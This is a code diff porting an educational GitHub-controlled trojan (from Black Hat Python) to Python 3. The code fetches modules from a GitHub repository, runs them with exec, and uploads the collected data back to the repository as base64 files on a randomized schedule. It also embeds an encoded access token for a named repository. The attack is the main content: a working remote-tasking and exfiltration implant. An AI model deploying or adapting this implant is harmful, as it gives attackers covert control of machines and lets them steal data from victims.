@@ -6,18 +6,18 @@ import time
 import imp
 import random
 import threading
-import Queue
+import queue
 import os
 
 from github3 import login
 
-trojan_id = "abc"
+trojan_id = "cfg"
 
 trojan_config = "%s.json" % trojan_id
 data_path = "data/%s/" % trojan_id
 trojan_modules = []
 
-task_queue = Queue.Queue()
+task_queue = queue.Queue()
 configured = False
 
 
@@ -30,7 +30,7 @@ class GitImporter(object):
     def find_module(self, fullname, path=None):
 
         if configured:
-            print "[*] Attempting to retrieve %s" % fullname
+            print("[*] Attempting to retrieve % s" % fullname)
             new_library = get_file_contents("modules/%s" % fullname)
 
             if new_library is not None:
@@ -43,7 +43,7 @@ class GitImporter(object):
 
         module = imp.new_module(name)
 
-        exec self.current_module_code in module.__dict__
+        exec(self.current_module_code, module.__dict__)
 
         sys.modules[name] = module
 
@@ -51,8 +51,9 @@ class GitImporter(object):
 
 
 def connect_to_github():
-    gh = login(username="blackhatpythonbook", password="justin1234")
-    repo = gh.repository("blackhatpythonbook", "chapter7")
+    token_str = "NTc0OGI4YTYzNTJlMWFkZDBjODhhNWEwZjVkMjA3MzE1ZWQ3NWVhNA=="
+    gh = login(username="", password="", token=base64.b64decode(token_str))
+    repo = gh.repository("Max88888", "python_bhp")
     branch = repo.branch("master")
 
     return gh, repo, branch
@@ -61,13 +62,13 @@ def connect_to_github():
 def get_file_contents(filepath):
 
     gh, repo, branch = connect_to_github()
-
-    tree = branch.commit.commit.tree.recurse()
+    print("branch link : ", branch.links)
+    tree = branch.commit.commit.tree.refresh().recurse()
 
     for filename in tree.tree:
 
         if filepath in filename.path:
-            print "[*] Found file %s" % filepath
+            print("[*] Found file %s" % filepath)
 
             blob = repo.blob(filename._json_data['sha'])
 
@@ -98,7 +99,7 @@ def store_module_result(data):
 
     remote_path = "data/%s/%d.data" % (trojan_id, random.randint(1000, 100000))
 
-    repo.create_file(remote_path, "Commit message", base64.b64encode(data))
+    repo.create_file(remote_path, "Commit message", base64.b64encode(data.encode()))
 
     return
 
@@ -118,15 +119,13 @@ def module_runner(module):
 # main trojan loop
 sys.meta_path = [GitImporter()]
 
-while True:
+if task_queue.empty():
 
-    if task_queue.empty():
+    config = get_trojan_config()
 
-        config = get_trojan_config()
+    for task in config:
+        t = threading.Thread(target=module_runner, args=(task['module'],))
+        t.start()
+        time.sleep(random.randint(1, 10))
 
-        for task in config:
-            t = threading.Thread(target=module_runner, args=(task['module'],))
-            t.start()
-            time.sleep(random.randint(1, 10))
-
-    time.sleep(random.randint(1000, 10000))
+time.sleep(random.randint(100, 200))
